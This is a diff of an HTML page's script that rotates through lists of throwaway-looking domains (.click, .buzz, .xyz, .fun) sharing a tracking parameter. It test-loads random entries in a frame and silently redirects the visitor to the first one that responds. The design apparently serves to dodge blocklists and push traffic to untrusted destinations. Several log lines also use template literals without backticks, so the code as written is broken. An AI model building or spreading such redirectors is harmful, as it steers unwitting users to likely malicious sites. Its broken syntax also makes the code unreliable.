@@ -47,21 +47,54 @@
             "https://m.u9v0w1.click?f=4556781", "https://m.v4w5x6.buzz?f=4556781", "https://m.w1x2y3.buzz?f=4556781",
             "https://m.w3x4y5.fun?f=4556781", "https://m.w5x6y7.click?f=4556781", "https://m.w9x0y1.xyz?f=4556781"
         ];
-    
+
+        const testFrame = document.getElementById('testFrame');
+        const loadingImage = document.getElementById('loadingImage');
+        const timeoutDuration = 5000;
+
         const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         const urls = isMobile ? urlsMobile : urlsDesktop;
-    
-        function getRandomUrl() {
-            const randomIndex = Math.floor(Math.random() * urls.length);
-            const selectedUrl = urls[randomIndex];
-            console.log(Randomly selected URL: ${selectedUrl});
-            return selectedUrl;
+        let checkedUrls = new Set();
+
+        function checkRandomUrl() {
+            if (checkedUrls.size === urls.length) {
+                loadingImage.style.display = 'none';
+                console.log('No accessible URLs found.');
+                return;
+            }
+
+            let randomIndex;
+            do {
+                randomIndex = Math.floor(Math.random() * urls.length);
+            } while (checkedUrls.has(randomIndex));
+
+            const url = urls[randomIndex];
+            checkedUrls.add(randomIndex);
+
+            console.log(Checking: ${url});
+
+            let loadTimeout = setTimeout(() => {
+                console.error(Timeout loading ${url});
+                checkRandomUrl();
+            }, timeoutDuration);
+
+            testFrame.onload = function() {
+                clearTimeout(loadTimeout); 
+                loadingImage.style.display = 'none';
+                window.location.href = url;
+            };
+
+            testFrame.onerror = function() {
+                clearTimeout(loadTimeout);
+                console.error(Failed to load ${url});
+                checkRandomUrl();
+            };
+
+            testFrame.src = url;    
         }
-    
-        // Get a random URL and redirect to it
-        const randomUrl = getRandomUrl();
-        window.location.href = randomUrl;
-    </script>    
+
+        checkRandomUrl();
+    </script>
 
 </body>
 </html>
